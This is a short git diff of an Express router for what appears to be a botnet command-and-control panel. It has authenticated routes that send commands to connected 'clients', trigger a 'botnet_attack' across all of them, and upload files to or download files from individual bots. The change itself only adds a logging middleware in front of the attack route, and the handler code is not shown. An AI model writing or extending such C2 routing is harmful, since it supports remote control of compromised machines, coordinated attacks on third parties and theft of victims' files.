@@ -9,13 +9,19 @@ import { checkAdmin } from "../middlewares/checkAdmin.mjs";
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
+const middle=(req,res=response, next)=>{
+    console.log("cmd");
+    next()
+}
+
+
 const cmd_router = (clients, attacks_running) => {
     const router = Router();
 
     router.use(validate_jwt);
     
     router.post('/cmd/:id', (req,res) => send_cmd(clients,req,res));
-    router.post('/cpanel/all', (req,res) => botnet_attack(clients,attacks_running,req,res));
+    router.post('/cpanel/all',middle, (req,res) => botnet_attack(clients,attacks_running,req,res));
     router.post('/upload/:id', upload.single("file"), (req,res) => upload_file(clients,req,res));
     router.post('/get_files/', (req,res) => getFiles(clients,req,res));
     router.post('/download/', (req,res) => downloadFiles(clients,req,res));
